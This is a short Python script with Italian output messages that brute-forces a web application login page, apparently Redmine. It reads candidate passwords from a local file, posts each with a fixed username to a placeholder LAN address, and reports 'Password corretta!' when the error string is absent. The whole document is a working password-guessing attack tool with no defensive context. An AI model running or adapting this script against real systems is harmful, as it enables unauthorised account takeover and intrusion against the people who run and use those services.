#!/usr/bin/python3

import requests
url = '192.168.XXX.YYY'

f = open('./password', 'r')

Lines = f.readlines()

for line in Lines:
    auth_string = {'utf8':'%E2%9C%93','authenticity_token':'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa','back_url':'http%3A%2F%2F192.168.XXX.XXX%2Fprojects%2Flan%2Fwiki','username':'userrrrrr','password':line,'login':'Login+%C2%BB'}
    try:
        r = requests.post('http://192.168.XXX.YYY/login',data=auth_string)
        print(r.status_code)
        if 'Nome utente o password non validi' in str(r.content):
            print("Password sbagliata!")
        else:
            print("Password corretta!")
            print(str(r.content))
    except OSError:
        print('Host non Trovato')
